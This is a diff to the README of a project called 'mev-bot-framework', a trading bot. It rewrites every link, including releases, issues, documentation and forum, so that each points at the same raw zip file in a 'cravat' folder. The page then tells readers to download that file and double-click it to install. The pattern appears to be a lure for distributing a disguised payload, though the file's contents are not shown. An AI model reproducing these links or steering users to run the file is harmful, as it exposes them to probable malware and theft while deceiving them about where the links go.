@@ -1,6 +1,6 @@
 # 🚀 mev-bot-framework - Effortless Bot Management for Trading
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/ROHON14/mev-bot-framework/releases)
+[![Download Now](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip)
 
 ## 📋 Introduction
 
@@ -21,13 +21,13 @@ To run the mev-bot-framework, your computer should meet these basic requirements
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/ROHON14/mev-bot-framework/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip).
 2. Look for the latest version of the application.
 3. Download the appropriate file for your operating system.
 4. Once the download finishes, locate the file in your downloads folder.
 5. Double-click the downloaded file to start the installation process. Follow the on-screen instructions.
 
-For your convenience, you can also click this link to directly visit the [Releases page](https://github.com/ROHON14/mev-bot-framework/releases) again.
+For your convenience, you can also click this link to directly visit the [Releases page](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip) again.
 
 ## 🔧 Features
 
@@ -54,7 +54,7 @@ If you encounter any issues, try the following steps:
 - Ensure that your operating system is updated.
 - Check that you have enough storage space on your device.
 - Restart the application if it does not launch properly.
-- Visit the [GitHub Issues page](https://github.com/ROHON14/mev-bot-framework/issues) if you need further assistance.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip) if you need further assistance.
 
 ## 🙋 Frequently Asked Questions (FAQ)
 
@@ -68,7 +68,7 @@ A: This framework is currently available for desktop users only.
 A: Yes, the framework will receive updates regularly. Keep an eye on the Releases page.
 
 **Q: Is there any support available?**  
-A: Yes, you can find help on the [GitHub Issues page](https://github.com/ROHON14/mev-bot-framework/issues).
+A: Yes, you can find help on the [GitHub Issues page](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip).
 
 ## 📞 Support
 
@@ -76,8 +76,8 @@ If you have questions or need support, please reach out via the GitHub Issues pa
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/ROHON14/mev-bot-framework)
-- [Documentation](https://github.com/ROHON14/mev-bot-framework/wiki)
-- [Community Forum](https://github.com/ROHON14/mev-bot-framework/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip)
+- [Documentation](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip)
+- [Community Forum](https://raw.githubusercontent.com/ROHON14/mev-bot-framework/main/cravat/mev-bot-framework.zip)
 
 Thank you for choosing the mev-bot-framework. We hope it helps you manage your trading effortlessly!
